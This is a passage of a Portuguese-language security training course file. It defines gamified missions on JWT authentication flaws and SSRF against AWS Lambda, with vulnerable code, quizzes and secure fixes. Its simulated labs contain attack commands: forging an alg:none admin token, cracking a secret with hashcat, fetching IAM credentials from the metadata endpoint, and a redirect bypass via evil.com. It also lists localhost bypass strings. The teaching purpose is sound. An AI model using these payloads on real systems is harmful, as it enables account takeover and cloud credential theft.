    difficulty: '★★★☆☆',
    time: '~40 min',
    xp: 400,
    unlocked: false,
    rune: 'chave',
    runeIcon: '✦',
    briefing: {
      objetivo: 'Identificar três classes de falhas JWT e implementar verificação robusta com secret seguro.',
      contexto: 'Sistema de autenticação do ÆGIS usa JWT com secret hardcoded, sem restrição de algoritmo e sem verificação de expiração.',
      impacto: 'Forja de tokens com qualquer payload, acesso como admin, comprometimento total — sem brute force, sem credenciais roubadas.',
    },
    steps: [
      {
        id: 1,
        title: 'o vetor',
        content: `<span class="hl">Broken Authentication</span> — qualquer falha que permita assumir identidade alheia ou contornar o login.<br><br>
JWT é Base64, não criptografia. Qualquer um pode ler o payload. A segurança está <span class="hl">exclusivamente na assinatura</span> — que depende do secret.<br><br>
Três vetores independentes, cada um suficiente para comprometer:
<br>① <span class="warn">Secret fraco</span> — quebrável por hashcat em segundos
<br>② <span class="warn">alg:none</span> — remove a assinatura completamente
<br>③ <span class="warn">Sem verificação de exp</span> — tokens vivem para sempre`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│          JWT — ESTRUTURA E VETORES DE ATAQUE             │
├──────────────────────────────────────────────────────────┤
│  eyJhbGciOiJIUzI1NiJ9  .  eyJzdWIiOiI0MiJ9  .  SIG     │
│  └─── HEADER (b64) ──┘    └─ PAYLOAD (b64) ┘   └─ SIG ┘│
│                                                          │
│  HEADER:  {"alg":"HS256","typ":"JWT"}                    │
│  PAYLOAD: {"sub":"42","role":"user","exp":1234567890}    │
│  SIG:     HMAC-SHA256(header.payload, SECRET)            │
├──────────────────────────────────────────────────────────┤
│  ATAQUE 1: alg:none                                      │
│  Header → {"alg":"none"} → sem assinatura → qualquer    │
│  payload é aceito sem verificação                        │
├──────────────────────────────────────────────────────────┤
│  ATAQUE 2: brute force do secret                         │
│  secret="secret" → hashcat wordlist → 3 segundos        │
│  Loki assina {"sub":"1","role":"admin"} com o secret    │
├──────────────────────────────────────────────────────────┤
│  ATAQUE 3: token sem expiração                           │
│  exp não verificado → token de 2020 ainda funciona      │
│  Token vazado = acesso permanente                        │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: 'JWT não é criptografia — é assinatura. O payload é público. A única proteção é a integridade da assinatura, que depende 100% do secret.',
      },

      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ vulnerável',
        vulnCode: `<span class="ln">1</span>  <span class="kw">const</span> jwt = <span class="kw">require</span>(<span class="str">'jsonwebtoken'</span>);
<span class="ln">2</span>
<span class="ln">3</span>  <span class="kw">function</span> <span class="fn">verifyToken</span>(token) {
<span class="ln">4</span>    <span class="kw">try</span> {
<span class="ln">5</span>      <span class="cm">// ⚠ secret hardcoded, fraco, no repositório</span>
<span class="ln">6</span>      <span class="kw">const</span> decoded = jwt.<span class="fn">verify</span>(token, <span class="bad">'secret'</span>);
<span class="ln">7</span>      <span class="cm">// ⚠ aceita qualquer algoritmo — incluindo 'none'</span>
<span class="ln">8</span>      <span class="cm">// ⚠ exp verificado, mas pode ser ignorado com alg:none</span>
<span class="ln">9</span>      <span class="kw">return</span> decoded;
<span class="ln">10</span>   } <span class="kw">catch</span> (e) {
<span class="ln">11</span>     <span class="bad">return null;</span> <span class="cm">// falha silenciosa — null propagado</span>
<span class="ln">12</span>   }
<span class="ln">13</span>  }
<span class="ln">14</span>
<span class="ln">15</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">16</span>    <span class="kw">const</span> user = <span class="fn">verifyToken</span>(event.headers.Authorization);
<span class="ln">17</span>    <span class="cm">// ⚠ continua se user for null (token inválido)</span>
<span class="ln">18</span>    <span class="bad">if (user?.role === 'admin') { /* acesso irrestrito */ }</span>
<span class="ln">19</span>  };`,
        attackBox: {
          title: '// três formas de comprometer',
          content: `<strong>Ataque 1 — alg:none:</strong>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">Header: {"alg":"none"} → payload: {"sub":"1","role":"admin"} → sem assinatura</span></div>
<strong>Ataque 2 — brute force:</strong>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">hashcat jwt.txt rockyou.txt → secret="secret" em 3s → token admin forjado</span></div>
<strong>Ataque 3 — token expirado reutilizado:</strong>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">Token de 2021 com role=admin → sem verificação de exp → ainda funciona</span></div>`,
        },
        aegisTip: 'Três vetores, cada um suficiente para comprometimento total. Secret fraco desfaz qualquer outra proteção.',

        lab: {
          type: 'terminal',
          title: '// LAB 1 — Forje um token JWT',
          description: 'Entenda como cada ataque funciona na prática. Execute os ataques no terminal simulado.',
          xpReward: 40,
          terminal: {
            prompt: 'attacker@kali:~$',
            prelude: [
              '// Contexto: JWT interceptado de um usuário normal',
              '// Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.SIG',
              '// Objetivo: obter acesso como admin',
              '',
            ],
            challenges: [
              {
                instruction: 'Decodifique o payload JWT (sem verificar assinatura):',
                payload: 'echo "eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0" | base64 -d',
                expectedOutput: [
                  '{"sub":"42","role":"user","exp":1700000000}',
                  '',
                  '// JWT é apenas Base64. Qualquer um pode ler o payload.',
                  '// A segurança está na assinatura, não na confidencialidade.',
                ],
                hint: 'JWT não criptografa — apenas codifica. Use base64 -d para ler qualquer payload.',
              },
              {
                instruction: 'Crie um token com alg:none e role=admin:',
                payload: 'node -e "const h=btoa(JSON.stringify({alg:\'none\'})); const p=btoa(JSON.stringify({sub:\'1\',role:\'admin\'})); console.log(h+\'.\'+p+\'.\');"',
                expectedOutput: [
                  'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.',
                  '',
                  '// Token sem assinatura. Payload modificado para admin.',
                  '// Se o servidor não restringir algoritmos, aceita como válido.',
                ],
                hint: 'O token termina em ponto — sem assinatura. Bibliotecas vulneráveis aceitam alg:none.',
              },
              {
                instruction: 'Tente brute force do secret com hashcat (simulado):',
                payload: 'hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt',
                expectedOutput: [
                  'Session.........: hashcat',
                  'Status...........: Cracked',
                  'Hash.Mode........: 16500 (JWT Tokens)',
                  '',
                  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.SIG:secret',
                  '',
                  '// Secret encontrado: "secret"',
                  '// Tempo: 0.003s — 47.3 kH/s',
                  '// Agora o Loki pode assinar qualquer payload como legítimo.',
                ],
                hint: '"secret" está no topo de qualquer wordlist. 256 bits de entropia mínimo para ser resistente.',
              },
            ],
            finalMessage: '// Você viu os três vetores. Um secret fraco desfaz toda outra proteção. alg:none elimina a necessidade de secret.',
          },
        },
      },

      {
        id: 3,
        title: 'lab — audit de implementação',
        aegisTip: 'Em JWT, cada opção de verificação importa. Uma opção ausente pode ser o vetor de comprometimento.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Audite implementações JWT',
          description: 'Você é o auditor. Analise cada implementação e identifique a vulnerabilidade específica.',
          xpReward: 50,
          questions: [
            {
              code: `const decoded = jwt.verify(token, process.env.JWT_SECRET);
// JWT_SECRET = "mysecret123" definido no .env commitado`,
              q: 'Qual é o problema desta implementação?',
              opts: [
                'process.env não funciona em Lambda',
                'JWT_SECRET no .env commitado é equivalente a hardcoded — exposto no repositório',
                'jwt.verify não aceita process.env como segundo argumento',
                'Não há problema — .env é seguro por definição',
              ],
              correct: 1,
              exp: '.env commitado expõe o secret no git history para sempre. Usar AWS Secrets Manager ou Parameter Store injetados em runtime — nunca no repositório.',
            },
            {
              code: `const decoded = jwt.verify(token, SECRET, {
  algorithms: ['HS256', 'RS256', 'none']
});`,
              q: 'Por que esta configuração é perigosa?',
              opts: [
                'RS256 é mais fraco que HS256 para Lambda',
                '\'none\' na lista de algoritmos aceita tokens sem assinatura',
                'Múltiplos algoritmos causam race condition',
                'jwt.verify não aceita array de algoritmos',
              ],
              correct: 1,
              exp: 'Incluir \'none\' na lista aceita tokens com alg:none — sem assinatura, sem verificação. O atacante gera payload com qualquer conteúdo e o servidor aceita como legítimo.',
            },
            {
              code: `try {
  const decoded = jwt.decode(token); // não verifica assinatura
  if (decoded.role === 'admin') {
    // acesso admin
  }
} catch(e) { return 401; }`,
              q: 'jwt.decode() vs jwt.verify() — qual o problema?',
              opts: [
                'jwt.decode() é mais rápido e suficiente para verificar role',
                'jwt.decode() apenas decodifica Base64 — não verifica a assinatura. Qualquer payload é aceito.',
                'jwt.decode() lança exceção em tokens inválidos, o catch é suficiente',
                'Não há diferença funcional entre decode() e verify()',
              ],
              correct: 1,
              exp: 'jwt.decode() é equivalente a base64 decode — lê o payload sem verificar a assinatura. Qualquer um pode criar um token com role:admin e jwt.decode() aceita. Sempre use jwt.verify().',
            },
          ],
        },
      },

      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          'Secret via AWS Secrets Manager — 256+ bits, nunca hardcoded ou em repositório.',
          '<code>algorithms: [\'HS256\']</code> explícito — rejeita alg:none e outros.',
          'Verificação de expiração implícita em jwt.verify() + retorno 401 em qualquer falha.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="kw">const</span> jwt = <span class="kw">require</span>(<span class="str">'jsonwebtoken'</span>);
<span class="ln">2</span>
<span class="ln">3</span>  <span class="kw">function</span> <span class="fn">verifyToken</span>(authHeader) {
<span class="ln">4</span>    <span class="good">if (!authHeader?.startsWith('Bearer ')) return null;</span>
<span class="ln">5</span>    <span class="kw">const</span> token = authHeader.<span class="fn">split</span>(<span class="str">' '</span>)[1];
<span class="ln">6</span>    <span class="kw">try</span> {
<span class="ln">7</span>      <span class="good">return jwt.verify(token, process.env.JWT_SECRET, {</span>
<span class="ln">8</span>      <span class="good">  algorithms: ['HS256'],     // rejeita alg:none</span>
<span class="ln">9</span>      <span class="good">  clockTolerance: 30,        // 30s tolerância de relógio</span>
<span class="ln">10</span>     <span class="good">  complete: false,           // retorna apenas o payload</span>
<span class="ln">11</span>     <span class="good">});</span>
<span class="ln">12</span>    } <span class="kw">catch</span> (e) {
<span class="ln">13</span>      <span class="good">return null;</span> <span class="cm">// qualquer erro → null → 401</span>
<span class="ln">14</span>    }
<span class="ln">15</span>  }
<span class="ln">16</span>
<span class="ln">17</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">18</span>    <span class="good">const user = verifyToken(event.headers.Authorization);</span>
<span class="ln">19</span>    <span class="good">if (!user) return { statusCode: 401, body: 'não autorizado' };</span>
<span class="ln">20</span>    <span class="good">if (user.role !== 'admin') return { statusCode: 403, body: 'acesso negado' };</span>
<span class="ln">21</span>    <span class="cm">// lógica admin aqui — usuário verificado</span>
<span class="ln">22</span>  };`,
        aegisTip: 'Secret seguro + algoritmo fixo + falha sempre retorna 401. Nenhum token forjado passa por todas as três barreiras.',

        lab: {
          type: 'ordering',
          title: '// LAB 3 — Ordene as verificações JWT',
          description: 'Arranje as verificações na ordem correta de execução. A ordem importa — uma verificação fora de lugar cria gaps.',
          xpReward: 45,
          instructions: 'Coloque as linhas na ordem correta para uma verificação JWT segura:',
          items: [
            { id: 'a', code: 'if (!authHeader?.startsWith("Bearer ")) return { statusCode: 401 };', label: 'Verificar formato do header' },
            { id: 'b', code: 'const token = authHeader.split(" ")[1];', label: 'Extrair o token do header' },
            { id: 'c', code: 'const decoded = jwt.verify(token, SECRET, { algorithms: ["HS256"] });', label: 'Verificar assinatura e algoritmo' },
            { id: 'd', code: 'if (!decoded) return { statusCode: 401 };', label: 'Checar se decodificação foi bem-sucedida' },
            { id: 'e', code: 'if (decoded.role !== "admin") return { statusCode: 403 };', label: 'Verificar autorização (role)' },
            { id: 'f', code: '// lógica do endpoint aqui', label: 'Executar lógica de negócio' },
          ],
          correctOrder: ['a', 'b', 'c', 'd', 'e', 'f'],
          explanation: 'Verificar formato → extrair token → verificar assinatura → checar resultado → verificar autorização → executar. Pular qualquer etapa cria um gap.',
        },
      },

      {
        id: 5,
        title: 'checkpoint final',
        aegisTip: 'Broken Auth não grita. Funciona perfeitamente para usuários legítimos. É silenciosa até que o Loki use.',
      },
    ],

    quiz: [
      {
        q: 'Por que jwt.verify() deve receber a opção algorithms explicitamente?',
        opts: [
          'Para melhorar a performance — verificar só um algoritmo é mais rápido',
          'Para evitar o ataque alg:none onde o token é aceito sem assinatura',
          'O padrão JWT 3.0 exige o campo algorithms obrigatoriamente',
          'Para suportar tokens RS256 e HS256 simultaneamente',
        ],
        correct: 1,
        exp: 'Sem algorithms explícito, algumas versões da biblioteca aceitam alg:none — um token sem assinatura com payload arbitrário. algorithms:[\'HS256\'] rejeita qualquer algoritmo não listado.',
      },
      {
        q: 'O que jwt.decode() faz diferente de jwt.verify()?',
        opts: [
          'decode() é mais rápido pois não faz operações criptográficas',
          'decode() apenas decodifica Base64 sem verificar a assinatura — qualquer payload é aceito',
          'decode() valida exp mas não a assinatura',
          'decode() usa algoritmo RS256 enquanto verify() usa HS256',
        ],
        correct: 1,
        exp: 'jwt.decode() = base64url decode. Lê o payload sem nenhuma verificação criptográfica. Usando decode() para autorização, qualquer um com um editor de texto pode se tornar admin.',
      },
      {
        q: 'Onde deve estar JWT_SECRET em produção em AWS Lambda?',
        opts: [
          'Hardcoded no código — mais simples e sem dependência externa',
          'Em arquivo .env excluído do .gitignore — nunca commitado',
          'Em AWS Secrets Manager injetado como variável de ambiente em runtime',
          'No payload JWT como claim "secret" — acessível apenas ao backend',
        ],
        correct: 2,
        exp: 'AWS Secrets Manager injeta o valor como env var em runtime. O código lê process.env.JWT_SECRET sem conhecer o valor. Rotacionável sem redeploy. Auditável. Nunca em arquivo ou código.',
      },
      {
        q: 'Um JWT com exp: 9999999999 (ano 2286) e assinatura válida é aceito por jwt.verify().',
        opts: [
          'Sim — a assinatura é válida, portanto o token é válido',
          'Não — jwt.verify() rejeita exp muito distante no futuro',
          'Sim, a menos que maxAge seja configurado explicitamente na chamada verify()',
          'Não — exp é sempre verificado como menor que 30 dias',
        ],
        correct: 2,
        exp: 'jwt.verify() aceita tokens com exp distante se a assinatura for válida. Para limitar a vida máxima de tokens independente do exp, use a opção maxAge: "15m". Isso protege contra tokens de longa duração vazados.',
      },
      {
        q: 'Um atacante interceptou um JWT de um usuário. O token expira em 1 hora. O que limita o dano?',
        opts: [
          'Tokens JWT são criptografados — o atacante não consegue usá-lo',
          'Token rotation: tokens curtos + refresh tokens com revogação possível',
          'O HTTPS impede que tokens interceptados sejam reutilizados',
          'JWT tem fingerprint do IP — tokens de IPs diferentes são rejeitados',
        ],
        correct: 1,
        exp: 'Access tokens curtos (15min) + refresh tokens em HttpOnly cookie com possibilidade de revogação (blacklist no Redis). Token vazado expira rápido. Refresh token pode ser invalidado em logout ou detecção de comprometimento.',
      },
    ],
  },

  /* ═══════════════════════════════════════════════════════
     MISSÃO 04 — O Servidor Espelho (SSRF)
     Dificuldade: ★★★★☆  →  avançado
  ═══════════════════════════════════════════════════════ */
  {
    id: 4,
    slug: 'servidor-espelho',
    title: 'O Servidor Espelho',
    vector: 'SSRF',
    difficulty: '★★★★☆',
    time: '~45 min',
    xp: 500,
    unlocked: false,
    rune: 'espelho',
    runeIcon: '◈',
    briefing: {
      objetivo: 'Explorar SSRF para acessar metadata AWS, depois implementar allowlist robusta resistente a bypass.',
      contexto: 'Lambda de preview de URL aceita qualquer destino. O endpoint de metadata AWS está acessível de dentro da função.',
      impacto: 'Credenciais IAM temporárias (acesso completo à conta AWS), scan da rede interna, exfiltração via serviços internos.',
    },
    steps: [
      {
        id: 1,
        title: 'o vetor',
        content: `<span class="hl">SSRF — Server-Side Request Forgery</span>. O atacante controla uma URL que o servidor vai buscar — forçando acesso a recursos que ele não poderia acessar diretamente.<br><br>
Em AWS Lambda, o alvo mais crítico é <code>http://169.254.169.254</code> — o Instance Metadata Service (IMDS). Retorna <span class="danger">credenciais IAM temporárias</span> do role da função sem nenhuma autenticação adicional.<br><br>
Com as credenciais do IAM role, o atacante tem acesso programático à conta AWS com todas as permissões que a Lambda possui — S3, DynamoDB, SSM Parameter Store, outros Lambdas.`,
        diagram: `
┌──────────────────────────────────────────────────────────┐
│              SSRF — FLUXO DE COMPROMETIMENTO             │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ATACANTE        LAMBDA (vítima)      IMDS / REDE INT.   │
│      │                │                     │            │
│      │  url=http://   │                     │            │
│      │  169.254.169.  │                     │            │
│      │  254/latest/   │                     │            │
│      │  meta-data/... │                     │            │
│      ├──────────────▶│                     │            │
│      │               │──── GET request ───▶│            │
│      │               │◀── credenciais ─────│            │
│      │◀──────────────│                     │            │
│  AccessKeyId                                             │
│  SecretAccessKey  ← conta AWS comprometida              │
│  SessionToken                                            │
├──────────────────────────────────────────────────────────┤
│  OUTROS ALVOS SSRF:                                      │
│  http://localhost:8080/admin   → painel admin interno    │
│  http://10.0.1.15:5432        → banco PostgreSQL         │
│  http://172.16.0.1            → router interno           │
│  file:///etc/passwd           → filesystem da Lambda    │
└──────────────────────────────────────────────────────────┘`,
        aegisTip: '169.254.169.254 é o alvo mais crítico. Sem autenticação. Retorna credenciais IAM completas. É o primeiro teste de qualquer exploit de SSRF em AWS.',
      },

      {
        id: 2,
        title: 'o código vulnerável',
        vulnLabel: '⚠ vulnerável',
        vulnCode: `<span class="ln">1</span>  <span class="cm">// Lambda — preview de URL (SSRF)</span>
<span class="ln">2</span>  <span class="kw">const</span> fetch = <span class="kw">require</span>(<span class="str">'node-fetch'</span>);
<span class="ln">3</span>
<span class="ln">4</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">5</span>    <span class="cm">// ⚠ URL do cliente sem validação alguma</span>
<span class="ln">6</span>    <span class="kw">const</span> targetUrl = <span class="bad">event.queryStringParameters.url</span>;
<span class="ln">7</span>
<span class="ln">7</span>    <span class="cm">// ⚠ fetch irrestrito — qualquer destino</span>
<span class="ln">8</span>    <span class="kw">const</span> res  = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="bad">targetUrl</span>);
<span class="ln">9</span>    <span class="kw">const</span> body = <span class="kw">await</span> res.<span class="fn">text</span>();
<span class="ln">10</span>
<span class="ln">11</span>   <span class="kw">return</span> { statusCode: <span class="str">200</span>, body };
<span class="ln">12</span>  };`,
        attackBox: {
          title: '// exploração SSRF — rota de credenciais',
          content: `O Loki envia como URL:<br>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-execution-role</span></div>
Resposta da Lambda:<br>
<div class="code-block" style="margin:6px 0;font-size:10px;"><span class="bad">{"AccessKeyId":"ASIA3X...","SecretAccessKey":"wJalrX...","Token":"IQoJ...","Expiration":"2024-..."}</span></div>
Com isso: <code>aws configure</code> + acesso completo ao IAM role da Lambda.`,
        },
        aegisTip: 'A função não foi invadida. Foi instruída a buscar suas próprias credenciais e entregá-las ao atacante. SSRF usa o servidor como proxy contra si mesmo.',

        lab: {
          type: 'terminal',
          title: '// LAB 1 — Explore os vetores SSRF',
          description: 'Execute os payloads de SSRF e observe o que uma Lambda sem proteção expõe.',
          xpReward: 45,
          terminal: {
            prompt: 'attacker@kali:~$',
            prelude: [
              '// Target: POST /api/preview?url=<input>',
              '// Sem validação de URL. Sem allowlist.',
              '',
            ],
            challenges: [
              {
                instruction: 'Acesse o metadata AWS via SSRF:',
                payload: 'curl "https://api.aegis.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role"',
                expectedOutput: [
                  '{',
                  '  "Code": "Success",',
                  '  "LastUpdated": "2024-01-15T14:22:00Z",',
                  '  "Type": "AWS-HMAC",',
                  '  "AccessKeyId": "ASIA3XKYZABC123456",',
                  '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",',
                  '  "Token": "IQoJb3JpZ2luX2VjEJr...",',
                  '  "Expiration": "2024-01-15T20:22:00Z"',
                  '}',
                  '',
                  '// Credenciais IAM obtidas. Válidas por ~6 horas.',
                ],
                hint: '169.254.169.254 é acessível de dentro de qualquer Lambda sem autenticação.',
              },
              {
                instruction: 'Use as credenciais para listar S3 buckets da conta:',
                payload: 'AWS_ACCESS_KEY_ID=ASIA3X... AWS_SECRET_ACCESS_KEY=wJalrX... AWS_SESSION_TOKEN=IQoJb3... aws s3 ls',
                expectedOutput: [
                  '2024-01-10 aegis-backups-prod',
                  '2024-01-10 aegis-secrets-vault',
                  '2024-01-10 aegis-users-data-encrypted',
                  '2024-01-10 aegis-logs-archive',
                  '',
                  '// 4 buckets S3. Com as permissões do role, potencialmente acessíveis.',
                  '// aegis-secrets-vault: nome sugestivo.',
                ],
                hint: 'As credenciais temporárias funcionam como as do role. Mesmo acesso, mesmas permissões.',
              },
              {
                instruction: 'Tente bypass de allowlist com redirect:',
                payload: 'curl "https://api.aegis.com/preview?url=https://evil.com/redirect"',
                expectedOutput: [
                  '// evil.com/redirect retorna: HTTP 301 → http://169.254.169.254/...',
                  '// Se a Lambda segue redirects automaticamente...',
                  '',
                  '{"AccessKeyId":"ASIA3X...","SecretAccessKey":"wJalrX...",',
                  '',
                  '// Bypass por redirect. A allowlist verificou evil.com (permitido),',
                  '// mas o fetch seguiu o redirect para o destino proibido.',
                ],
                hint: 'Allowlist no domínio sem checar redirects é contornável. node-fetch segue redirects por padrão.',
              },
            ],
            finalMessage: '// Três vetores: metadata direto, credenciais usadas, bypass por redirect. A defesa precisa cobrir todos.',
          },
        },
      },

      {
        id: 3,
        title: 'lab — identifique bypasses',
        aegisTip: 'SSRF tem mais vetores de bypass que qualquer outra vulnerabilidade web. Blocklist é sempre incompleta.',
        lab: {
          type: 'multiChoice',
          title: '// LAB 2 — Analise defesas contra SSRF',
          description: 'Cada tentativa de defesa abaixo tem uma falha. Identifique o bypass específico.',
          xpReward: 55,
          questions: [
            {
              code: `// Defesa implementada:
if (url.includes('169.254') || url.includes('localhost')) {
  return { statusCode: 400, body: 'url bloqueada' };
}
await fetch(url);`,
              q: 'Esta blocklist de strings é suficiente?',
              opts: [
                'Sim — cobre os dois principais vetores de SSRF',
                'Não — 127.0.0.1, [::1], 0177.0.0.1 (octal), http://0x7f000001 também apontam para localhost',
                'Não — faltou bloquear "internal" e "admin"',
                'Sim, se combinado com HTTPS obrigatório',
              ],
              correct: 1,
              exp: 'Blocklist de strings tem infinitas variações: 127.0.0.1, [::1], 0x7f000001, 0177.1, http://127.1, redirects, DNS rebinding. A única defesa robusta é allowlist de domínios aprovados.',
            },
            {
              code: `const parsed = new URL(url);
const allowed = ['github.com', 'cdn.example.com'];

if (!allowed.includes(parsed.hostname)) {
  return { statusCode: 400 };
}

const res = await fetch(url, { redirect: 'follow' }); // ← default`,
              q: 'Esta allowlist tem uma falha crítica. Qual é?',
              opts: [
                'new URL() lança exceção em URLs inválidas quebrando a função',
                'redirect:\'follow\' (default) segue redirects de github.com para 169.254.169.254 — bypass da allowlist',
                'parsed.hostname inclui a porta — URLs com :8080 passariam na allowlist',
                'A allowlist deveria usar startsWith ao invés de includes',
              ],
              correct: 1,
              exp: 'Com redirect:\'follow\', github.com pode redirecionar para 169.254.169.254. A allowlist valida o domínio inicial mas o fetch segue o redirect sem revalidação. Use redirect:\'manual\' e rejeite qualquer redirect.',
            },
            {
              code: `const parsed = new URL(url);
if (parsed.protocol !== 'https:') return { statusCode: 400 };
if (!ALLOWED_DOMAINS.has(parsed.hostname)) return { statusCode: 400 };

// Resolve o DNS para verificar o IP antes do fetch
const ip = await dns.resolve4(parsed.hostname);
const isPrivate = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip[0]);
if (isPrivate) return { statusCode: 400 };

await fetch(url);`,
              q: 'Esta defesa (allowlist + DNS check) ainda tem um vetor de ataque. Qual?',
              opts: [
                'HTTPS não impede acesso ao IMDS pois usa HTTP interno',
                'DNS rebinding: hostname resolve para IP público na verificação, depois muda para IP privado no fetch real',
                'dns.resolve4 não funciona em Lambda por restrições de VPC',
                'A regex de IP privado não cobre 169.254.x.x',
              ],
              correct: 1,
              exp: 'DNS rebinding: evil.com resolve para 1.2.3.4 (público) no momento do check, passa na validação. No momento do fetch (milissegundos depois), o DNS retorna 169.254.169.254. Time-of-check vs time-of-use (TOCTOU).',
            },
          ],
        },
      },

      {
        id: 4,
        title: 'a defesa',
        defensePoints: [
          'Allowlist de domínios aprovados — rejeitar qualquer URL não listada.',
          '<code>redirect: \'manual\'</code> — não seguir redirects automaticamente.',
          'Bloquear ranges privados após parsear com <code>URL()</code>.',
        ],
        secureLabel: '✓ seguro',
        secureCode: `<span class="ln">1</span>  <span class="kw">const</span> fetch = <span class="kw">require</span>(<span class="str">'node-fetch'</span>);
<span class="ln">2</span>
<span class="ln">3</span>  <span class="cm">// Allowlist explícita — só estes domínios, nada mais</span>
<span class="ln">4</span>  <span class="good">const ALLOWED_DOMAINS = new Set(['api.github.com', 'cdn.example.com', 'fonts.gstatic.com']);</span>
<span class="ln">5</span>  <span class="good">const PRIVATE_IP = /^(10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.|169\\.254\\.|::1|0\\.0\\.0\\.0)/);</span>
<span class="ln">6</span>
<span class="ln">7</span>  <span class="kw">function</span> <span class="fn">isSafeUrl</span>(rawUrl) {
<span class="ln">8</span>    <span class="kw">let</span> parsed;
<span class="ln">9</span>    <span class="good">try { parsed = new URL(rawUrl); } catch { return false; }</span>
<span class="ln">10</span>   <span class="good">if (parsed.protocol !== 'https:') return false;          // só HTTPS</span>
<span class="ln">11</span>   <span class="good">if (!ALLOWED_DOMAINS.has(parsed.hostname)) return false;  // allowlist</span>
<span class="ln">12</span>   <span class="good">if (PRIVATE_IP.test(parsed.hostname)) return false;       // sem IP privado</span>
<span class="ln">13</span>   <span class="kw">return true</span>;
<span class="ln">14</span>  }
<span class="ln">15</span>
<span class="ln">16</span>  <span class="kw">exports</span>.handler = <span class="kw">async</span> (event) => {
<span class="ln">17</span>    <span class="kw">const</span> rawUrl = event.queryStringParameters.url;
<span class="ln">18</span>    <span class="good">if (!isSafeUrl(rawUrl)) return { statusCode: 400, body: 'url não permitida' };</span>
<span class="ln">19</span>
<span class="ln">20</span>   <span class="good">const res = await fetch(rawUrl, {</span>
<span class="ln">21</span>   <span class="good">  redirect: 'manual',     // não seguir redirects</span>
<span class="ln">22</span>   <span class="good">  timeout: 5000,          // timeout de 5s</span>
<span class="ln">23</span>   <span class="good">  size: 1024 * 1024,      // max 1MB de response</span>
<span class="ln">24</span>   <span class="good">});</span>
<span class="ln">25</span>
<span class="ln">26</span>   <span class="good">if (res.status >= 300 && res.status < 400)</span>
<span class="ln">27</span>   <span class="good">  return { statusCode: 400, body: 'redirect não permitido' };</span>
<span class="ln">28</span>
<span class="ln">29</span>   <span class="kw">return</span> { statusCode: <span class="str">200</span>, body: <span class="kw">await</span> res.<span class="fn">text</span>() };
<span class="ln">30</span>  };`,
        aegisTip: 'Allowlist, não blocklist. Sem redirects. HTTPS obrigatório. Timeout e limite de tamanho. Cada linha fecha um vetor específico.',

        lab: {
          type: 'fillBlank',
          title: '// LAB 3 — Complete a allowlist de SSRF',
          description: 'Complete a função isSafeUrl() com as verificações corretas. Cada blank fecha um vetor de ataque.',
          xpReward: 60,
          template: `function isSafeUrl(rawUrl) {
  let parsed;
  try { parsed = new URL(rawUrl); } catch { return ___BLANK1___; }

  // Só HTTPS — HTTP pode acessar IMDS
  if (parsed.protocol !== ___BLANK2___) return false;

  // Allowlist — domínio deve estar na lista aprovada
  if (!ALLOWED_DOMAINS.___BLANK3___(parsed.hostname)) return false;

  // Bloquear IPs privados/metadata
  if (PRIVATE_IP.test(parsed.hostname)) return false;

  return true;
}

// No fetch: não seguir redirects
const res = await fetch(url, { redirect: ___BLANK4___ });

// Rejeitar qualquer resposta de redirect
if (res.status >= 300 && res.status < 400)
  return { statusCode: 400 };`,
          blanks: [
            {
              id: 'BLANK1',
              label: 'Valor de retorno quando URL é inválida (não parseable)',
              answer: 'false',
              alternatives: [],
              hint: 'URL inválida não é permitida. new URL() lança se a URL for malformada.',
            },
            {
              id: 'BLANK2',
              label: 'Protocolo seguro obrigatório (com dois pontos)',
              answer: "'https:'",
              alternatives: ['"https:"'],
              hint: 'http: permite acesso ao IMDS que não usa HTTPS.',
            },
            {
              id: 'BLANK3',
              label: 'Método de Set para verificar se hostname está na allowlist',
              answer: 'has',
              alternatives: [],
              hint: 'Set tem o método .has() para verificação O(1).',
            },
            {
              id: 'BLANK4',
              label: 'Opção para NÃO seguir redirects automaticamente',
              answer: "'manual'",
              alternatives: ['"manual"'],
              hint: 'O default é "follow" — seguir redirects. "manual" retorna o 3xx sem executar o redirect.',
            },
          ],
        },
      },

      {
        id: 5,
        title: 'checkpoint final',
        aegisTip: 'SSRF transforma o servidor em cúmplice. Allowlist, não blocklist. Redirects desabilitados. Dois princípios, uma proteção sólida.',
      },
    ],

    quiz: [
      {
        q: 'Por que http://169.254.169.254 é especialmente perigoso em SSRF contra Lambda?',
        opts: [
          'É o endereço de broadcast da VPC da Lambda',
          'O IMDS retorna credenciais IAM temporárias do role da Lambda sem autenticação adicional',
          'Dá acesso ao código fonte da função via HTTP',
          'É o DNS resolver interno da AWS — permite envenenar resoluções',
        ],
        correct: 1,
        exp: 'O Instance Metadata Service retorna credenciais temporárias válidas (AccessKeyId + SecretAccessKey + Token) do IAM role da função. Com elas, o atacante tem acesso à conta AWS com as permissões desse role.',
      },
      {
        q: 'Por que uma blocklist de IPs privados é sempre inferior a uma allowlist de domínios?',
        opts: [
